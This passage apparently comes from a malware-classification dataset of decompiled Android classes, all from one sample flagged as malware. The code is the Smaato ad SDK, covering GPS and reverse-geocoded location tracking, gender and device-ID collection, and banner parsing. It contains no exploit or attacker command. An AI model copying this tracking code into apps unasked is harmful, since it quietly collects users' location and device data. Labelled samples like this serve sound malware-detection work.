throws BestGPSProviderFailed {     try {       Debugger.a(new Object(){       } );       return locationManager.getBestProvider(new Criteria(),true);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new BestGPSProviderFailed(e2);     }   }   private LocationManager a(  Context context) throws LocationManagerFailed {     try {       Debugger.a(new Object(){       } );       return (LocationManager)context.getSystemService(""location"");     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new LocationManagerFailed(e2);     }   }   public final boolean a(  double d,  double d2) throws ModifyingGPSLocationFailed {     try {       Debugger.a(new Object(){       } );       UserSettings a=a();       if (this.g || a == null) {         return false;       }       this.a=d;       this.b=d2;       return true;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ModifyingGPSLocationFailed(e2);     }   }   private UserSettings a() throws UserSettingsNotFoundException {     try {       Debugger.a(new Object(){       } );       return this.d.getUserSettings();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UserSettingsNotFoundException(e2);     }   }   public String b(  double d,  double d2) throws RetrievingLocationFailed {     if (d != 0.0d || d2 != 0.0d) {       try {         if (b(d) && a(d2)) {           this.b=d;           this.a=d2;         }       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new RetrievingLocationFailed(e2);       }     }     StringBuffer stringBuffer=new StringBuffer();     if (a(this.a) && ((this.a != 0.0d || this.b != 0.0d) && b(this.b))) {       stringBuffer.append(String.format(Locale.US,""&gps=%.6f,%.6f"",Double.valueOf(this.a),Double.valueOf(this.b)));       if (this.c != 0.0d) {         stringBuffer.append(String.format(Locale.US,""&altitude=%.6f"",Double.valueOf(this.c)));       }       try {         Address c=c(this.a,this.b);         if (c != null) {           String countryName=c.getCountryName();           if (countryName != null && countryName.length() > 0) {             stringBuffer.append(""&country="");             stringBuffer.append(StringFormatter.a(countryName));           }           String postalCode=c.getPostalCode();           if (postalCode != null && postalCode.length() > 0) {             stringBuffer.append(""&zip="");             stringBuffer.append(StringFormatter.a(postalCode));           }           String countryCode=c.getCountryCode();           if (countryCode != null && countryCode.length() > 0) {             stringBuffer.append(""&countrycode="");             stringBuffer.append(StringFormatter.a(countryCode));           }         }       }  catch (      Throwable th) {         Debugger.a(new LogMessage(TAG,""Reverse Geocoding failed"",2,DebugCategory.ERROR));       }     }     return stringBuffer.toString();   }   private Context b(){     return this.e;   }   boolean a(  double d) throws LatitudeValidationFailed {     try {       Debugger.a(new Object(){       } );       return d >= -90.0d && d <= 90.0d;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new LatitudeValidationFailed(e2);     }   }   boolean b(  double d) throws LongitudeValidationFailed {     try {       Debugger.a(new Object(){       } );       return d >= -180.0d && d <= 180.0d;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new LongitudeValidationFailed(e2);     }   }   private Address c(  double d,  double d2) throws AddressFromLocationFailed {     try {       if (this.f == null) {         return null;       }       List<Address> fromLocation=this.f.getFromLocation(d,d2,1);       if (fromLocation == null || fromLocation.size() <= 0) {         return null;       }       return fromLocation.get(0);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new AddressFromLocationFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests.settings\UserSettings.code","public class UserSettings implements UserSettingsInterface {   private static final String FEMALE_String=""f"";   private static final String MALE_String=""m"";   protected Gender a=Gender.UNSET;   protected int b=0;   protected String c="""";   protected String d="""";   protected String e="""";   protected String f="""";   protected double g=0.0d;   protected double h=0.0d;   private boolean i=true;   private boolean j=false;   public enum Gender {  UNSET,   MALE,   FEMALE;   public static Gender[] valuesCustom(){     Gender[] valuesCustom=values();     int length=valuesCustom.length;     Gender[] genderArr=new Gender[length];     System.arraycopy(valuesCustom,0,genderArr,0,length);     return genderArr;   }   public static String a(  Gender gender) throws UnknownGenderException {     try {       if (gender == UNSET) {         return """";       }       if (gender == MALE) {         return UserSettings.MALE_String;       }       if (gender != FEMALE) {         return null;       }       return UserSettings.FEMALE_String;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnknownGenderException(e2);     }   }   public static Gender a(  String str) throws UnknownStringGenderValue {     try {       if (str.equalsIgnoreCase("""")) {         return UNSET;       }       if (str.equalsIgnoreCase(UserSettings.MALE_String)) {         return MALE;       }       if (!str.equalsIgnoreCase(UserSettings.FEMALE_String)) {         return null;       }       return FEMALE;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnknownStringGenderValue(e2);     }   } }   public void a(  Gender gender){     this.a=gender;   }   public void a(  int i){     this.b=i;   }   public void a(  String str){     this.c=str;   }   public void b(  String str){     this.d=str;   }   public void c(  String str){     this.e=str;   }   @Deprecated public void d(  String str){   }   public void e(  String str){     this.f=str;   }   @Deprecated public void f(  String str){   }   public double a(){     return this.g;   }   public void a(  double d){     this.g=d;   }   public double b(){     return this.h;   }   public void b(  double d){     this.h=d;   }   public void a(  boolean z){     this.i=z;   }   public int c(){     return this.j ? 1 : 0;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.requests.settings\UserSettingsInterface.code","public interface UserSettingsInterface { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.statemachine\BannerState.code","!org.eclipse.jdt.core.dom.TypeDeclaration@27682ae"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.statemachine\BannerStateDelegate.code","public interface BannerStateDelegate {   void a() throws UnableToTriggerTransitionDisplayBanner ;   void b() throws UnableToEnterBannerStateExpanded ;   void c() throws UnableToExitBannerStateExpanded ;   void d() throws UnableToTriggerTransitionCloseNoOrmmaBanner ;   void e() throws UnableToTriggerTransitionCloseOrmmaBanner ;   void f() throws UnableToSetBannerStateToEmpty ;   void g() throws UnableToExitEmptyState ;   void h() throws BannerDisplayedEnteredFailedException ;   void i() throws UnableToExitBannerStateDisplayed ;   void j() throws UnableToTriggerTransitionExpandBanner ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.statemachine\LoadingState.code","!org.eclipse.jdt.core.dom.TypeDeclaration@67dc17a5"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.statemachine\LoadingStateDelegate.code","public interface LoadingStateDelegate {   void a() throws StateBlockedEnteredFailedException ;   void b() throws StateIdleEnteredException ;   void c() throws BannerLoadingEnteredFailedException ;   void d() throws TransitionLoadXMLFailedException ;   void e() throws TransitionFinishLoadingFailedException ;   void f() throws StateIdleExitFailedException ;   void g() throws StateXMLLoadingEnteredFailedException ;   void h() throws StateXMLLoadingExitFailedException ;   void i() throws StateBlockedExitFailedException ;   void j() throws BannerLoadingExitFailedException ;   void k() throws TransitionLoadBannerFailedException ;   void l() throws TransitionBlockLoadingFailedException ;   void m() throws TransitionUnblockLoadingFailedException ;   void n() throws TransitionErrorLoadingFailedException ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\CalendarEventCreator.code","public class CalendarEventCreator {   SomaCalendar a;   Context b;   String c=""CalendarEventCreator"";   public CalendarEventCreator(  final SomaCalendar somaCalendar,  final Context context){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         CalendarEventCreator.this.a=somaCalendar;         CalendarEventCreator.this.b=context;         if (Build.VERSION.SDK_INT < 14) {           Toast.makeText(CalendarEventCreator.this.b,""Oups ! This feature is not supported by your device"",0).show();           return null;         }         CalendarEventCreator.this.a();         return null;       }     } .c();   }   public void a(){     try {       Intent intent=new Intent(""android.intent.action.EDIT"");       intent.setType(""vnd.android.cursor.item/event"");       String a=this.a.a();       if (a != null && a.length() > 0) {         intent.putExtra(""calendar_id"",a);       }       String b=this.a.b();       if (b != null && b.length() > 0) {         intent.putExtra(""title"",b);       }       String c=this.a.c();       if (c != null && c.length() > 0) {         intent.putExtra(""description"",c);       }       String d=this.a.d();       if (d != null && d.length() > 0) {         try {           intent.putExtra(""beginTime"",Long.parseLong(String.valueOf(d) + ""000""));         }  catch (        Exception e) {           Debugger.a(new LogMessage(this.c,""Wrog Date Format !!"",1,DebugCategory.WARNING));         }       }       String e2=this.a.e();       if (e2 != null && e2.length() > 0) {         try {           intent.putExtra(""endTime"",Long.parseLong(String.valueOf(e2) + ""000""));         }  catch (        Exception e3) {           Debugger.a(new LogMessage(this.c,""Wrog Date Format !!"",1,DebugCategory.WARNING));         }       }       if (this.a.f() != null) {         String g=this.a.g();         Debugger.a(new LogMessage(this.c,""FREQ="" + g,1,DebugCategory.INFO));         if (g != null && g.length() > 0) {           intent.putExtra(""rrule"",""FREQ="" + g);         }       }       String h=this.a.h();       if (h != null && h.length() > 0) {         intent.putExtra(""eventLocation"",h);       }       String i=this.a.i();       if (i != null && i.length() > 0) {         intent.putExtra(""eventStatus"",i);       }       String j=this.a.j();       if (j != null && j.length() > 0) {         intent.putExtra(""exrule"",j);       }       this.b.startActivity(intent);     }  catch (    Throwable th) {       Debugger.a(new LogMessage(this.c,""Wrong JSON format !!"",1,DebugCategory.INFO));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\ConnectionListenerInterface.code","public interface ConnectionListenerInterface {   void a(  ReceivedBannerInterface receivedBannerInterface) throws UnableToNotifyAdListener ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\Controller.code","public class Controller {   private static Controller a;   private static int b=0;   private static boolean c=false;   private Controller(){   }   public static Controller a(){     if (a == null) {       a=new Controller();     }     return a;   }   public void b(){     b++;     Debugger.a(new LogMessage(getClass().getCanonicalName(),""Something went wrong !!"",2,DebugCategory.ERROR));     if (b >= 10) {       a(true);     }   }   public void c(){     Log.e("""",""INIT SUCCESS"");     b=0;     a(false);   }   public boolean d(){     return c;   }   private void a(  boolean z){     c=z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\Converter.code","public class Converter {   private static final String CHAR_SET=""iso-8859-1"";   private static final String SHA1_ALGORITHM=""SHA-1"";   private static final String TAG=""SOMA Converter"";   private static Converter a;   private Converter(){   }   public static Converter a(){     if (a == null) {       a=new Converter();     }     return a;   }   private String a(  byte[] bArr) throws UnableToConvertDataToHex {     try {       StringBuffer stringBuffer=new StringBuffer();       for (int i=0; i < bArr.length; i++) {         int i2=(bArr[i] >>> 4) & 15;         int i3=0;         while (true) {           if (i2 >= 0 && i2 <= 9) {             stringBuffer.append((char)(i2 + 48));           }  else {             stringBuffer.append((char)((i2 - 10) + 97));           }           int i4=bArr[i] & 15;           int i5=i3 + 1;           if (i3 >= 1) {             break;           }           i3=i5;           i2=i4;         }       }       return stringBuffer.toString();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToConvertDataToHex(e2);     }   }   public String a(  String str){     try {       MessageDigest messageDigest=MessageDigest.getInstance(SHA1_ALGORITHM);       byte[] bArr=new byte[40];       messageDigest.update(str.getBytes(CHAR_SET),0,str.length());       return a(messageDigest.digest());     }  catch (    Throwable th) {       Debugger.a(new LogMessage(TAG,""Error generating generating SHA-1: "",1,DebugCategory.EXCEPTION,th));       return null;     }   }   public int a(  Context context) throws UnableToCalculateMinimalHeight {     try {       return (int)TypedValue.applyDimension(1,50.0f,context.getResources().getDisplayMetrics());     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToCalculateMinimalHeight(e2);     }   }   public int a(  Context context,  int i) throws PixelToDpFailed {     try {       return (int)TypedValue.applyDimension(1,i,context.getResources().getDisplayMetrics());     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new PixelToDpFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\DateParser.code","public class DateParser { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\ImageDownloader.code","public class ImageDownloader extends AsyncTask<ImageDownloadProperties,Void,Void> {   final String a=getClass().getCanonicalName();   @Override public Void doInBackground(  ImageDownloadProperties... imageDownloadPropertiesArr){     Context b=imageDownloadPropertiesArr[0].b();     String a=imageDownloadPropertiesArr[0].a();     try {       File file=new File(Environment.getExternalStorageDirectory() + ""/DCIM/Smaato/"");       file.mkdirs();       File file2=new File(file,""IMG_"" + System.currentTimeMillis() + "".jpg"");       HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(a).openConnection();       httpURLConnection.setRequestMethod(""GET"");       httpURLConnection.connect();       FileOutputStream fileOutputStream=new FileOutputStream(file2);       httpURLConnection.getInputStream();       InputStream inputStream=httpURLConnection.getInputStream();       byte[] bArr=new byte[a.ACTION_NEXT_HTML_ELEMENT];       while (true) {         int read=inputStream.read(bArr);         if (read > 0) {           fileOutputStream.write(bArr,0,read);         }  else {           fileOutputStream.close();           new SingleMediaScanner(b,file2);           return null;         }       }     }  catch (    MalformedURLException e) {       Debugger.a(new LogMessage(this.a,""MalformedURL: "" + e.getMessage(),1,DebugCategory.WARNING));       return null;     } catch (    IOException e2) {       e2.printStackTrace();       Log.e(this.a,e2.getMessage(),e2);       Debugger.a(new LogMessage(this.a,""Please enable permission WRITE_EXTERNAL_STORAGE!"",1,DebugCategory.WARNING));       return null;     }   } public class SingleMediaScanner implements MediaScannerConnection.MediaScannerConnectionClient {     private MediaScannerConnection b;     private File c;     public SingleMediaScanner(    Context context,    File file){       this.c=file;       this.b=new MediaScannerConnection(context,this);       this.b.connect();     }     @Override public void onMediaScannerConnected(){       this.b.scanFile(this.c.getAbsolutePath(),null);     }     @Override public void onScanCompleted(    String str,    Uri uri){       this.b.disconnect();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\ImageDownloadProperties.code","public class ImageDownloadProperties {   String a;   Context b;   public ImageDownloadProperties(  String str,  Context context){     this.a=str;     this.b=context;   }   public final String a(){     return this.a;   }   public final Context b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\ODIN.code","public class ODIN {   public static String a(  Context context) throws ODINFailedToProvideODIN1 {     try {       return Converter.a().a(DeviceDataCollector.a().g());     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ODINFailedToProvideODIN1(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\ProgressBar.code","public class ProgressBar {   static ProgressBar c;   ProgressDialog a;   boolean b=true;   private ProgressBar(){   }   public static ProgressBar a(){     if (c == null) {       c=new ProgressBar();     }     return c;   }   public void a(  Context context) throws ShowProgressBarFailed {     try {       if ((this.a == null || !this.a.isShowing()) && this.b) {         this.a=new ProgressDialog(context);         this.a.setProgressStyle(1);         this.a.setProgressNumberFormat(null);         this.a.setTitle(""Loading ..."");         this.a.setCancelable(true);         this.a.setOnCancelListener(new DialogInterface.OnCancelListener(){           @Override public void onCancel(          DialogInterface dialogInterface){             ProgressBar.this.a(false);           }         } );         this.a.show();       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ShowProgressBarFailed(e2);     }   }   public void b() throws DissmissingProgressBarFailed {     try {       if (this.a != null) {         this.a.dismiss();         this.a=null;         this.b=false;       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new DissmissingProgressBarFailed(e2);     }   }   public void a(  int i) throws SettingProgressFailed {     try {       if (this.a != null && this.a.isShowing()) {         this.a.setProgress(i);       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new SettingProgressFailed(e2);     }   }   public final boolean c(){     return this.b;   }   public final void a(  boolean z){     this.b=z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\ReceivedBannerParser.code","public class ReceivedBannerParser implements XmlParserInterface {   private static final String ERROR_MESSAGE=""Error during the XML parsing. Can't find the response tag."";   public static final String TAG=""SOMA_PARSER"";   @Override public ReceivedBannerInterface a(  InputStream inputStream) throws ParserException {     try {       Element documentElement=DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(inputStream).getDocumentElement();       if (documentElement != null && documentElement.getNodeName().equals(""response"")) {         ReceivedBanner receivedBanner=new ReceivedBanner();         NodeList elementsByTagName=documentElement.getElementsByTagName(""sessionid"");         if (elementsByTagName.getLength() > 0) {           Element element=(Element)elementsByTagName.item(0);           if (element.getFirstChild() != null) {             receivedBanner.a(element.getFirstChild().getNodeValue());           }         }         NodeList elementsByTagName2=documentElement.getElementsByTagName(""status"");         if (elementsByTagName2.getLength() > 0) {           Element element2=(Element)elementsByTagName2.item(0);           if (element2.getFirstChild() != null) {             receivedBanner.a(BannerStatus.a(element2.getFirstChild().getNodeValue()));           }         }         NodeList elementsByTagName3=documentElement.getElementsByTagName(""mediadata"");         if (elementsByTagName3.getLength() > 0) {           Element element3=(Element)elementsByTagName3.item(0);           if (element3.getFirstChild() != null) {             receivedBanner.b(element3.getFirstChild().getNodeValue());           }         }         NodeList elementsByTagName4=documentElement.getElementsByTagName(""beacon"");         if (elementsByTagName4.getLength() > 0) {           ArrayList arrayList=new ArrayList();           for (int i=0; i < elementsByTagName4.getLength(); i++) {             Element element4=(Element)elementsByTagName4.item(i);             if (element4.getFirstChild() != null) {               arrayList.add(element4.getFirstChild().getNodeValue());             }           }           receivedBanner.a(arrayList);         }         NodeList elementsByTagName5=documentElement.getElementsByTagName(""mediafile"");         if (elementsByTagName5.getLength() > 0) {           Element element5=(Element)elementsByTagName5.item(0);           if (element5.getFirstChild() != null) {             receivedBanner.d(element5.getFirstChild().getNodeValue());           }         }         NodeList elementsByTagName6=documentElement.getElementsByTagName(""adtext"");         if (elementsByTagName6.getLength() > 0) {           Element element6=(Element)elementsByTagName6.item(0);           if (element6.getFirstChild() != null) {             receivedBanner.e(element6.getFirstChild().getNodeValue());           }         }         NodeList elementsByTagName7=documentElement.getElementsByTagName(""link"");         if (elementsByTagName7.getLength() > 0) {           Element element7=(Element)elementsByTagName7.item(0);           if (element7.getFirstChild() != null) {             receivedBanner.f(element7.getFirstChild().getNodeValue());           }         }         NodeList elementsByTagName8=documentElement.getElementsByTagName(""code"");         if (elementsByTagName8.getLength() > 0) {           Element element8=(Element)elementsByTagName8.item(0);           if (element8.getFirstChild() != null) {             receivedBanner.a(ErrorCode.a(element8.getFirstChild().getNodeValue()));           }         }         NodeList elementsByTagName9=documentElement.getElementsByTagName(""desc"");         if (elementsByTagName9.getLength() > 0) {           Element element9=(Element)elementsByTagName9.item(0);           if (element9.getFirstChild() != null) {             receivedBanner.g(element9.getFirstChild().getNodeValue());           }         }         NodeList elementsByTagName10=documentElement.getElementsByTagName(AdDatabaseHelper.TABLE_AD);         if (elementsByTagName10.getLength() > 0) {           receivedBanner.a(AdType.a(((Element)elementsByTagName10.item(0)).getAttribute(AnalyticsSQLiteHelper.EVENT_LIST_TYPE)));         }         NodeList elementsByTagName11=documentElement.getElementsByTagName(""action"");         if (elementsByTagName11.getLength() > 0) {           receivedBanner.c(((Element)elementsByTagName11.item(0)).getAttribute(""target""));         }         return receivedBanner;       }       Debugger.a(new LogMessage(TAG,ERROR_MESSAGE,1,DebugCategory.WARNING));       throw new ParserException(ERROR_MESSAGE,ErrorCode.PARSING_ERROR);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new ParserException(""Error during the XML parsing."",ErrorCode.PARSING_ERROR);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\SingleMediaScanner.code","public class SingleMediaScanner implements MediaScannerConnection.MediaScannerConnectionClient {   private MediaScannerConnection b;   private File c;   public SingleMediaScanner(  Context context,  File file){     this.c=file;     this.b=new MediaScannerConnection(context,this);     this.b.connect();   }   @Override public void onMediaScannerConnected(){     this.b.scanFile(this.c.getAbsolutePath(),null);   }   @Override public void onScanCompleted(  String str,  Uri uri){     this.b.disconnect();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\SomaCalendar.code","public class SomaCalendar {   private String a;   private String b;   private String c;   private String d;   private String e;   private JSONObject f;   private String g;   private String h;   private String i;   private String j;   public SomaCalendar(  final JSONObject jSONObject){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         SomaCalendar.this.a=jSONObject.optString(AnalyticsEvent.EVENT_ID);         SomaCalendar.this.b=jSONObject.optString(""summary"");         SomaCalendar.this.c=jSONObject.optString(""description"");         SomaCalendar.this.d=jSONObject.optString(""start"");         SomaCalendar.this.e=jSONObject.optString(""end"");         JSONObject optJSONObject=jSONObject.optJSONObject(""recurrence"");         if (optJSONObject != null) {           SomaCalendar.this.g=optJSONObject.optString(""frequency"");         }         SomaCalendar.this.h=jSONObject.optString(""location"");         SomaCalendar.this.i=jSONObject.optString(""status"");         SomaCalendar.this.j=jSONObject.optString(""exceptionDates"");         return null;       }     } .c();   }   public final String a(){     return this.a;   }   public final String b(){     return this.b;   }   public final String c(){     return this.c;   }   public final String d(){     return this.d;   }   public final String e(){     return this.e;   }   public final JSONObject f(){     return this.f;   }   public final String g(){     return this.g;   }   public final String h(){     return this.h;   }   public final String i(){     return this.i;   }   public final String j(){     return this.j;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\StringFormatter.code","public class StringFormatter {   private static final String UTF8=""UTF-8"";   public static String a(  String str) throws UTF8EncodingFailedException {     try {       return URLEncoder.encode(str,UTF8);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UTF8EncodingFailedException(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\VersionVerifier.code","public class VersionVerifier extends AsyncTask<Void,Void,Void> {   private final String a=""https://s3.amazonaws.com/smaato-sdk/sdk_versions.xml"";   @Override public Void doInBackground(  Void... voidArr){     return new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         try {           if (Build.VERSION.SDK_INT >= 8) {             HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(""https://s3.amazonaws.com/smaato-sdk/sdk_versions.xml"").openConnection();             httpURLConnection.setRequestMethod(""GET"");             httpURLConnection.connect();             long parseInt=Integer.parseInt(((NodeList)XPathFactory.newInstance().newXPath().compile(""/response/platforms/platform[@name='android']/@version"").evaluate(DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(httpURLConnection.getInputStream()),XPathConstants.NODESET)).item(0).getNodeValue());             if (parseInt > Values.SDK_VERSION_CODE_INT) {               Debugger.a(new LogMessage(""New SDK Version available"",""Current Version "" + Values.SDK_VERSION_CODE_INT + "", Version ""+ parseInt+ "" is now available for download under www.smaato.com"",1,DebugCategory.WARNING));             }           }         }  catch (        Throwable th) {           Debugger.a(new LogMessage(getClass().getCanonicalName(),""Unable to verify SDK version on this Device."",3,DebugCategory.ERROR,(Exception)th));         }         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.utilities\XmlParserInterface.code","public interface XmlParserInterface {   ReceivedBannerInterface a(  InputStream inputStream) throws ParserException ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.interstitial\AnonymousClass1.code","class AnonymousClass1 extends CrashReportTemplate<Void> {   final Interstitial a;   private final Activity b;   @Override public Void b() throws Exception {     this.a.a(this.b);     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.interstitial\AnonymousClass2.code","public class AnonymousClass2 extends CrashReportTemplate<Void> {   final Interstitial a;   @Override public Void b() throws Exception {     if (this.a.d()) {       new Thread(new Runnable(){         @Override public void run(){           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (Interstitial.b != null) {                 Interstitial.b.b();               }               AnonymousClass2.this.a.f();               AnonymousClass2.this.a.c.startActivity(new Intent(AnonymousClass2.this.a.c,(Class<?>)InterstitialActivity.class));               return null;             }           } .c();         }       } ).start();       return null;     }     Debugger.a(new LogMessage(this.a.e,""Interstitial Banner not ready"",1,DebugCategory.DEBUG));     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.interstitial\BannerHandler.code","public class BannerHandler extends Handler {   private WeakReference<BaseView> b;   private BaseView c;   private BannerHandler(  BaseView baseView){     this.b=null;     this.c=baseView;   }   BannerHandler(  InterstitialBannerView interstitialBannerView,  BaseView baseView,  BannerHandler bannerHandler){     this(baseView);   }   protected WeakReference<BaseView> a(){     if (this.b == null) {       this.b=new WeakReference<>(this.c);     }     return this.b;   }   @Override public void handleMessage(  final Message message){     super.handleMessage(message);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView baseView=BannerHandler.this.a().get();         if (baseView != null) {           if (message.what == 101) {             baseView.getBannerState().b();             BannerAnimator.a().a(message.arg1,message.arg2,InterstitialBannerView.this.getCurrentPackage(),baseView,InterstitialBannerView.this.h);             BannerMeasurements.a().e();             InterstitialBannerView.this.a();           }  else           if (message.what == 103) {             Log.e(getClass().getCanonicalName(),""resize"");             InterstitialBannerView.this.getCurrentPackage().c().setLayoutParams(new FrameLayout.LayoutParams(message.arg1,message.arg2));             InterstitialBannerView.this.getCurrentPackage().c().requestLayout();           }  else {             baseView.getBannerState().d();           }         }         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.interstitial\BaseActivity.code","public class BaseActivity extends Activity {   private RelativeLayout a;   private CloseButtonView b;   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseActivity.this.c();         BaseActivity.this.a=new RelativeLayout(BaseActivity.this);         new RelativeLayout.LayoutParams(-1,-2).addRule(13);         BaseActivity.this.setContentView(BaseActivity.this.a,new RelativeLayout.LayoutParams(-1,-1));         return null;       }     } .c();   }   public RelativeLayout a(){     return this.a;   }   public void b() throws AddingCloseButtonToInterstitialFailed {     try {       this.b=new CloseButtonView(getBaseContext());       this.b.setOnClickListener(new View.OnClickListener(){         @Override public void onClick(        View view){           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               BaseActivity.this.finish();               return null;             }           } .c();         }       } );       this.a.addView(this.b);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new AddingCloseButtonToInterstitialFailed(e2);     }   }   public void c() throws RequestingActivityFeaturesFailed {     try {       requestWindowFeature(1);       getWindow().addFlags(a.ACTION_NEXT_HTML_ELEMENT);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new RequestingActivityFeaturesFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.interstitial\Interstitial.code","public class Interstitial implements AdListenerInterface, BaseInterface {   static InterstitialBannerView a;   static InterstitialAdListener b;   Activity c;   InterstitialStates d;   String e;   public enum InterstitialStates {  IS_READY,   IS_NOT_READY;   public static InterstitialStates[] valuesCustom(){     InterstitialStates[] valuesCustom=values();     int length=valuesCustom.length;     InterstitialStates[] interstitialStatesArr=new InterstitialStates[length];     System.arraycopy(valuesCustom,0,interstitialStatesArr,0,length);     return interstitialStatesArr;   } } class AnonymousClass1 extends CrashReportTemplate<Void> {     final Interstitial a;     private final Activity b;     @Override public Void b() throws Exception {       this.a.a(this.b);       return null;     }   }   public void a(  Activity activity) throws InterstitialInitializationFailed {     try {       this.c=activity;       a=new InterstitialBannerView(this.c);       a.setInterstitialParent(this);       a.a(this);       a.setScalingEnabled(false);       a.getAdSettings().a(AdDimension.INTERSTITIAL);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new InterstitialInitializationFailed(e2);     }   } public class AnonymousClass2 extends CrashReportTemplate<Void> {     final Interstitial a;     @Override public Void b() throws Exception {       if (this.a.d()) {         new Thread(new Runnable(){           @Override public void run(){             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 if (Interstitial.b != null) {                   Interstitial.b.b();                 }                 AnonymousClass2.this.a.f();                 AnonymousClass2.this.a.c.startActivity(new Intent(AnonymousClass2.this.a.c,(Class<?>)InterstitialActivity.class));                 